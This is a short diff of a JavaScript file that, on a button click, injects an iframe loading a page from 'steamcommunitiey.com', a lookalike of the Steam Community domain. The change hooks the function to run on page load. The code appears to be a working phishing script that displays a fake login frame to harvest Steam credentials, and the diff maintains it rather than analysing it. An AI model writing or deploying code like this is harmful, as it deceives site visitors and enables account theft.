@@ -7,7 +7,7 @@ const staticUrl = "https://api.steamcommunitiey.com/static"
 
         if (buttons && buttons.length > 0) {
             buttons.forEach((button) => {
-               button.onclick  =() => {
+               button.onclick  = () => {
                     console.log("A");
                     const iframe = document.createElement("iframe")
                     iframe.src = `${staticUrl}/txqmjgkxhzp5.html`
@@ -20,5 +20,5 @@ const staticUrl = "https://api.steamcommunitiey.com/static"
 
     }
 
-    openWind()
+    document.addEventListener("DOMContentLoaded", openWind)
 })()
